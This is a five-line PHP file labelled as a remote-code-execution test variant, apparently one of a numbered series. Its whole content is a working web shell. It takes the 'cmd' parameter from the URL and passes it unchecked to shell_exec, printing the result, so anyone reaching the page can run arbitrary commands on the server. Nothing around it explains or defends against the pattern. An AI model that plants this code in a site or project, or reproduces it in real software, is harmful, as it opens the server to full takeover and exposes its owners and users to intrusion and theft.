<?php
// RCE test variation #810
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>